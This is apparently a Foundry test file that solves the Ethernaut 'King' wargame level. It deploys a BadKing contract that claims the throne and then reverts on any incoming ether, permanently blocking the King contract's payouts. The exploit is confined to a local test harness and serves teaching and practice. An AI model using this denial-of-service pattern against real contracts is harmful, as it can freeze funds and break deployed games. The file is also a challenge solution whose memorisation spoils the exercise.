pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/09-King/KingFactory.sol';
import '../core/Ethernaut.sol';

contract BadKing {
  address kingAddr;

  constructor(address _king) {
    kingAddr = _king;
  }
    
  // This should trigger King fallback(), making this contract the king
  function becomeKing() payable external {
    (bool sent, bytes memory data) = payable(kingAddr).call{value: msg.value}("");
    require(sent, "Failed to send Ether");
  }
    
  // This function fails "king.transfer" trx from Ethernaut
  receive() external payable {
      revert("Whoops, sorry!");
  }
}

contract KingTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testKingHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    KingFactory kingFactory = new KingFactory();
    ethernaut.registerLevel(kingFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance{value: 10 wei}(kingFactory);
    King kingContract = King(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    //assertEq(kingContract._king(), address(this));
    emit log_named_address(
      'Confirm attacker is not king', 
      kingContract._king()
    );

    uint256 currentPrize = kingContract.prize();
    assertGe(currentPrize, 0);

    // create the bad contract
    uint256 targetVal = currentPrize + 1;
    BadKing badKingContract = new BadKing(address(kingContract));

    badKingContract.becomeKing{value: targetVal}();
    assertEq(kingContract._king(), address(badKingContract));
    emit log_named_address(
      'Confirm BadKing is now king', 
      kingContract._king()
    );

    currentPrize = kingContract.prize();
    // now we have had king on our malicious contract, we can force reverts
    vm.expectRevert("Whoops, sorry!");
    address(kingContract).call{value: currentPrize + 1}("");
  
    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

